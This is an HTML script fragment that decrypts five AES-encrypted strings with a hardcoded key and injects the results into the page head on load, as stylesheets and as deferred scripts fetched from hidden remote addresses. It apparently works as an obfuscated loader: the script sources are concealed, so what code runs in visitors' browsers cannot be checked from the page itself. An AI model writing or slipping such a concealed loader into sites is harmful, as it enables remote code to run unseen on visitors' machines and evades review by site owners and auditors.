<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<script>
  const encryptedFiles = [
    { t: "b", d: "U2FsdGVkX1+b7HybDYQNd5p+lfuwezjoXCLwwb2ATWDtyI+gP7zY1up40HVLjeXpX2TSQaG8sDDlOQz2Hzfy5lPlmMGDn6hMNGb1g3qrPVlEbUGzpnNyoH+pG9lZ6Mpg" },
    { t: "b", d: "U2FsdGVkX1+pdEiNJaIxP3twYvPwGRThxD+3hs6rmAzNTLvu+hBwQ/fwZZ0Ih330LDUWGKWL211L7N2KK6QVi+oERG2jWEWLVmYXvV85g5xw41BGW3JJs1LhKzjgdVhF" },
    { t: "b", d: "U2FsdGVkX19zyfEcrRSyl72BMSs7ahm2r8i5q8a7i9rhgfoml84sU9KfhN7WC5YHOpzd4lPIqhVRvBS1M3ReNAGHT3gqILz2EjetVSGqRHvfmL1uXBnEbQ2TDEYAuP5/" },
    { t: "r", d: "U2FsdGVkX1+XQb8Pw94vkkhEOR8QVCp1wEB+PdpCnKNSO7kEdyUp4EF1WO6+zJ1k0SzvIw5NMWtErCSUXkNMSe711vZ7lMQ/NWuqhVtiqqEmLSpEUuzfzEWWlfzs00dB" },
    { t: "r", d: "U2FsdGVkX1/V6Mp/4dAys0yiKPAtTepxsS9hm9JsugLLIWPS0P/WWcKPp3gyusSRWTWc8kjd3jhvE2RtEZCJGcFRpzfrktIPG7RAk/lH088PeotDXjn5PjKCAqi2TlIm" },
  ];

  const key = "robotnikencod";

  encryptedFiles.forEach(file => {
    const decrypted = CryptoJS.AES.decrypt(file.d, key).toString(CryptoJS.enc.Utf8);
    if (file.t === "b") {
      const link = document.createElement("link");
      link.rel = "stylesheet";
      link.href = decrypted;
      document.head.appendChild(link);
    } else if (file.t === "r") {
      const script = document.createElement("script");
      script.src = decrypted;
      script.defer = true;
      document.head.appendChild(script);
    }
  });
</script>
